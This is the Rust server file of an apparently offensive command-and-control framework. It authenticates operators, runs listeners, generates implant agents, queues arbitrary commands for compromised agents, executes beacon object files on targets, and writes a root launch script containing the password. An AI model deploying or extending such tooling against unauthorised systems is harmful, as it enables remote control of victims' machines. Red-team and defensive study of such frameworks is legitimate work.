// src/server.rs
use std::sync::{Arc, Mutex};
use std::net::SocketAddr;
use std::collections::HashMap;
use std::fs::File;
use std::io::Write;
use tokio::net::{TcpListener, TcpStream};
use tokio::sync::mpsc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use serde::{Serialize, Deserialize};
use clap::Parser;
use log::{info, error, warn};

// Import your existing modules (we need to access listeners, agents, etc.)
mod listener;
mod agent;
mod bof;
mod crypto;
mod models;
mod utils;

use crate::listener::{Listener, ListenerConfig, get_all_agents, add_task_for_agent, TaskResult};
use agent::{AgentGenerator, AgentConfig};
use bof::BofExecutor;
use models::agent::Agent;

// Command-line arguments
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// IP address to bind the server to
    #[arg(default_value = "0.0.0.0")]
    ip_address: String,

    /// Password for authentication
    #[arg(required = true)]
    password: String,

    /// Port to listen on
    #[arg(short, long, default_value_t = 50050)]
    port: u16,
}

// Message types for communication between client and server
#[derive(Serialize, Deserialize, Debug, Clone)]
enum ClientMessage {
    Authenticate { password: String },
    AddListener { config: ListenerConfig },
    StartListener { id: usize },
    StopListener { id: usize },
    GetListeners,
    GenerateAgent { config: AgentConfig },
    GetAgents,
    ExecuteBof { bof_path: String, args: String, target: String },
    ExecuteCommand { agent_id: String, command: String },
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum ServerMessage {
    AuthResult { success: bool, message: String },
    ListenersUpdate { listeners: Vec<ListenerInfo> },
    AgentsUpdate { agents: Vec<Agent> },
    CommandResult { agent_id: String, task_id: String, command: String, output: String, success: bool },
    Error { message: String },
    Success { message: String },
}

#[derive(Serialize, Deserialize, Debug, Clone)]
struct ListenerInfo {
    id: usize,
    config: ListenerConfig,
    running: bool,
}

// Server state
struct ServerState {
    listeners: Vec<Listener>,
    agent_generator: AgentGenerator,
    bof_executor: BofExecutor,
    clients: HashMap<String, mpsc::Sender<ServerMessage>>,
    password: String,
}

impl ServerState {
    fn new(password: String) -> Self {
        ServerState {
            listeners: Vec::new(),
            agent_generator: AgentGenerator::new(),
            bof_executor: BofExecutor::new(),
            clients: HashMap::new(),
            password,
        }
    }

    // Get listener information for clients
    fn get_listener_info(&self) -> Vec<ListenerInfo> {
        self.listeners
            .iter()
            .enumerate()
            .map(|(id, listener)| ListenerInfo {
                id,
                config: listener.config.clone(),
                running: listener.is_running(),
            })
            .collect()
    }

    // Add a new listener
    fn add_listener(&mut self, config: ListenerConfig) -> Result<(), String> {
        let listener = Listener::new(config);
        self.listeners.push(listener);
        Ok(())
    }

    // Start a listener
    fn start_listener(&mut self, id: usize) -> Result<(), String> {
        if id >= self.listeners.len() {
            return Err("Invalid listener ID".into());
        }

        self.listeners[id].start().map_err(|e| e.to_string())
    }

    // Stop a listener
    fn stop_listener(&mut self, id: usize) -> Result<(), String> {
        if id >= self.listeners.len() {
            return Err("Invalid listener ID".into());
        }

        self.listeners[id].stop().map_err(|e| e.to_string())
    }

    // Generate an agent
    fn generate_agent(&mut self, config: AgentConfig) -> Result<(), String> {
        self.agent_generator.generate(config).map_err(|e| e.to_string())
    }

    // Execute a BOF
    fn execute_bof(&mut self, bof_path: &str, args: &str, target: &str) -> Result<(), String> {
        self.bof_executor.execute(bof_path, args, target).map_err(|e| e.to_string())
    }

    // Get all client senders for broadcasting
    fn get_client_senders(&self) -> Vec<mpsc::Sender<ServerMessage>> {
        self.clients.values().cloned().collect()
    }
}

// Broadcast updates to all clients (non-async version)
async fn broadcast_updates(
    listeners: Vec<ListenerInfo>,
    agents: Vec<Agent>,
    client_senders: Vec<mpsc::Sender<ServerMessage>>,
) {
    let listeners_update = ServerMessage::ListenersUpdate { listeners };
    let agents_update = ServerMessage::AgentsUpdate { agents };

    for tx in client_senders {
        let _ = tx.send(listeners_update.clone()).await;
        let _ = tx.send(agents_update.clone()).await;
    }
}

// Handle an individual client connection
async fn handle_client(
    stream: TcpStream, 
    addr: SocketAddr,
    state: Arc<Mutex<ServerState>>,
) {
    info!("New client connected: {}", addr);

    // Create channels for communication
    let (client_tx, mut client_rx) = mpsc::channel::<ServerMessage>(100);

    // Split the stream into read and write halves
    let (mut read_half, mut write_half) = stream.into_split();

    let mut buffer = [0u8; 4096];
    let mut authenticated = false;

    // Add a temporary entry for this client
    {
        let mut state = state.lock().unwrap();
        state.clients.insert(addr.to_string(), client_tx.clone());
    }

    // Set up the client receiver task for sending messages to the client
    let addr_clone = addr;
    let receiver_task = tokio::spawn(async move {
        while let Some(msg) = client_rx.recv().await {
            let data = bincode::serialize(&msg).unwrap();
            let len = data.len() as u32;

            // Send message length first, then the message
            if write_half.write_all(&len.to_be_bytes()).await.is_err() {
                break;
            }
            if write_half.write_all(&data).await.is_err() {
                break;
            }
            if write_half.flush().await.is_err() {
                break;
            }
        }
        info!("Client sender task ended for {}", addr_clone);
    });

    // Main client handling loop for receiving messages from the client
    loop {
        // Read message length (4 bytes)
        let mut len_bytes = [0u8; 4];
        match read_half.read_exact(&mut len_bytes).await {
            Ok(_) => {},
            Err(_) => break,
        }

        let len = u32::from_be_bytes(len_bytes) as usize;
        if len > buffer.len() {
            error!("Message too large from client {}", addr);
            break;
        }

        // Read the message
        match read_half.read_exact(&mut buffer[0..len]).await {
            Ok(_) => {},
            Err(_) => break,
        }

        // Deserialize the message
        let msg: ClientMessage = match bincode::deserialize(&buffer[0..len]) {
            Ok(msg) => msg,
            Err(e) => {
                error!("Failed to deserialize message from {}: {}", addr, e);
                continue;
            }
        };

        // Handle the message
        match msg {
            ClientMessage::Authenticate { password } => {
                let (success, message, listeners_update, agents_update) = {
                    let state = state.lock().unwrap();
                    let success = password == state.password;
                    let message = if success { 
                        "Authentication successful".to_string() 
                    } else { 
                        "Invalid password".to_string() 
                    };
                    
                    let listeners_update = if success {
                        Some(ServerMessage::ListenersUpdate { 
                            listeners: state.get_listener_info() 
                        })
                    } else {
                        None
                    };
                    
                    let agents_update = if success {
                        Some(ServerMessage::AgentsUpdate { 
                            agents: get_all_agents() 
                        })
                    } else {
                        None
                    };
                    
                    (success, message, listeners_update, agents_update)
                };
                
                authenticated = success;
                let auth_result = ServerMessage::AuthResult { success, message };
                if let Err(e) = client_tx.send(auth_result).await {
                    error!("Failed to send auth result to {}: {}", addr, e);
                    break;
                }
                
                // If authenticated, send initial state
                if authenticated {
                    if let Some(listeners_update) = listeners_update {
                        if let Err(e) = client_tx.send(listeners_update).await {
                            error!("Failed to send listeners update to {}: {}", addr, e);
                            break;
                        }
                    }
                    
                    if let Some(agents_update) = agents_update {
                        if let Err(e) = client_tx.send(agents_update).await {
                            error!("Failed to send agents update to {}: {}", addr, e);
                            break;
                        }
                    }
                }
            },

            // All other messages require authentication
            _ if !authenticated => {
                let error_msg = ServerMessage::Error { 
                    message: "Not authenticated".to_string() 
                };
                if let Err(e) = client_tx.send(error_msg).await {
                    error!("Failed to send error to {}: {}", addr, e);
                    break;
                }
            },

            ClientMessage::AddListener { config } => {
                let (result, listeners, agents, client_senders) = {
                    let mut state = state.lock().unwrap();
                    let result = state.add_listener(config);
                    let listeners = state.get_listener_info();
                    let agents = get_all_agents();
                    let client_senders = state.get_client_senders();
                    (result, listeners, agents, client_senders)
                };
                
                let response = match result {
                    Ok(_) => ServerMessage::Success { 
                        message: "Listener added successfully".to_string() 
                    },
                    Err(e) => ServerMessage::Error { 
                        message: format!("Failed to add listener: {}", e) 
                    },
                };
                
                if let Err(e) = client_tx.send(response).await {
                    error!("Failed to send response to {}: {}", addr, e);
                    break;
                }
                
                // Broadcast updates to all clients
                tokio::spawn(async move {
                    broadcast_updates(listeners, agents, client_senders).await;
                });
            },

            ClientMessage::StartListener { id } => {
                let (result, listeners, agents, client_senders) = {
                    let mut state = state.lock().unwrap();
                    let result = state.start_listener(id);
                    let listeners = state.get_listener_info();
                    let agents = get_all_agents();
                    let client_senders = state.get_client_senders();
                    (result, listeners, agents, client_senders)
                };
                
                let response = match result {
                    Ok(_) => ServerMessage::Success { 
                        message: format!("Listener {} started successfully", id) 
                    },
                    Err(e) => ServerMessage::Error { 
                        message: format!("Failed to start listener {}: {}", id, e) 
                    },
                };
                
                if let Err(e) = client_tx.send(response).await {
                    error!("Failed to send response to {}: {}", addr, e);
                    break;
                }
                
                // Broadcast updates to all clients
                tokio::spawn(async move {
                    broadcast_updates(listeners, agents, client_senders).await;
                });
            },

            ClientMessage::StopListener { id } => {
                let (result, listeners, agents, client_senders) = {
                    let mut state = state.lock().unwrap();
                    let result = state.stop_listener(id);
                    let listeners = state.get_listener_info();
                    let agents = get_all_agents();
                    let client_senders = state.get_client_senders();
                    (result, listeners, agents, client_senders)
                };
                
                let response = match result {
                    Ok(_) => ServerMessage::Success { 
                        message: format!("Listener {} stopped successfully", id) 
                    },
                    Err(e) => ServerMessage::Error { 
                        message: format!("Failed to stop listener {}: {}", id, e) 
                    },
                };
                
                if let Err(e) = client_tx.send(response).await {
                    error!("Failed to send response to {}: {}", addr, e);
                    break;
                }
                
                // Broadcast updates to all clients
                tokio::spawn(async move {
                    broadcast_updates(listeners, agents, client_senders).await;
                });
            },

            ClientMessage::GetListeners => {
                let listeners_update = {
                    let state = state.lock().unwrap();
                    ServerMessage::ListenersUpdate { 
                        listeners: state.get_listener_info() 
                    }
                };
                
                if let Err(e) = client_tx.send(listeners_update).await {
                    error!("Failed to send listeners to {}: {}", addr, e);
                    break;
                }
            },

            ClientMessage::GenerateAgent { config } => {
                let result = {
                    let mut state = state.lock().unwrap();
                    state.generate_agent(config)
                };
                
                let response = match result {
                    Ok(_) => ServerMessage::Success { 
                        message: "Agent generated successfully".to_string() 
                    },
                    Err(e) => ServerMessage::Error { 
                        message: format!("Failed to generate agent: {}", e) 
                    },
                };
                
                if let Err(e) = client_tx.send(response).await {
                    error!("Failed to send response to {}: {}", addr, e);
                    break;
                }
            },

            ClientMessage::GetAgents => {
                let agents_update = ServerMessage::AgentsUpdate { 
                    agents: get_all_agents()
                };
                
                if let Err(e) = client_tx.send(agents_update).await {
                    error!("Failed to send agents to {}: {}", addr, e);
                    break;
                }
            },

            ClientMessage::ExecuteCommand { agent_id, command } => {
                let task_id = add_task_for_agent(&agent_id, command.clone());
                
                let response = ServerMessage::Success { 
                    message: format!("Command '{}' queued for agent {} (Task: {})", command, agent_id, task_id)
                };
                
                if let Err(e) = client_tx.send(response).await {
                    error!("Failed to send response to {}: {}", addr, e);
                    break;
                }
            },

            ClientMessage::ExecuteBof { bof_path, args, target } => {
                let result = {
                    let mut state = state.lock().unwrap();
                    state.execute_bof(&bof_path, &args, &target)
                };
                
                let response = match result {
                    Ok(_) => ServerMessage::Success { 
                        message: "BOF executed successfully".to_string() 
                    },
                    Err(e) => ServerMessage::Error { 
                        message: format!("Failed to execute BOF: {}", e) 
                    },
                };
                
                if let Err(e) = client_tx.send(response).await {
                    error!("Failed to send response to {}: {}", addr, e);
                    break;
                }
            },
        }
    }

    // Clean up
    receiver_task.abort();
    {
        let mut state = state.lock().unwrap();
        state.clients.remove(&addr.to_string());
    }

    info!("Client disconnected: {}", addr);
}

// Generate a simple teamserver script
fn generate_teamserver_script(ip: &str, port: u16, password: &str) -> std::io::Result<()> {
    let script_content = format!(
        r#"#!/bin/bash
# C2 Framework Teamserver Script

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo "Please run as root"
    exit 1
fi

# Start the C2 server
echo "Starting C2 Server on {}:{}..."
./c2_server {} "{}" --port {}
"#,
        ip, port, ip, password, port
    );

    let mut file = File::create("teamserver")?;
    file.write_all(script_content.as_bytes())?;

    // Make the script executable
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = std::fs::metadata("teamserver")?.permissions();
        perms.set_mode(0o755);
        std::fs::set_permissions("teamserver", perms)?;
    }

    Ok(())
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Initialize logging
    env_logger::init();

    // Parse command-line arguments
    let args = Args::parse();

    // Generate teamserver script if it doesn't exist
    if !std::path::Path::new("teamserver").exists() {
        match generate_teamserver_script(&args.ip_address, args.port, &args.password) {
            Ok(_) => info!("Generated teamserver script"),
            Err(e) => warn!("Failed to generate teamserver script: {}", e),
        }
    }

    // Create the server state
    let state = Arc::new(Mutex::new(ServerState::new(args.password.clone())));

    // Set up the TCP listener
    let addr = format!("{}:{}", args.ip_address, args.port).parse::<SocketAddr>()?;
    let listener = TcpListener::bind(&addr).await?;

    info!("C2 Server listening on {}", addr);

    // Accept connections
    loop {
        match listener.accept().await {
            Ok((stream, addr)) => {
                let state_clone = Arc::clone(&state);
                tokio::spawn(async move {
                    handle_client(stream, addr, state_clone).await;
                });
            }
            Err(e) => {
                error!("Error accepting connection: {}", e);
            }
        }
    }
}